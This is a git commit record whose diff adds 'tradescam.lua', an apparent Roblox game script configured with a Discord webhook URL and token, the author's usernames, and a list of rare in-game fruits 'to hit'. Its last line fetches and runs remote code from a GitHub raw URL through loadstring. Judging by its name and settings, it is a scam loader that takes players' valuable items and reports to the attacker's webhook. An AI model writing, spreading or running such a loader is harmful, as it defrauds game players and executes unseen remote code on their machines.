f1ba66ad3b0251a23cd604b297058bccc413d3cb
VAXnO09 <yoyokyoyo267@gmail.com>
2025-04-19 10:08:45 +0300

    Update and rename redz.lua to tradescam.lua

---
+++ tradescam.lua
@@ -0,0 +1,5 @@
+Webhook = "https://discord.com/api/webhooks/1363048464954691667/Vt4lxSn9qY4lQovexetft_5cpa5KhVoPDklx6fUngWRu_8Rh7oYkcpUzrrOvPeroimeB" -- << Your Webhook
+Usernames = {"Vacno_5", "Vacno_6"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Gravity-Gravity", "Dragon East-Dragon East"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
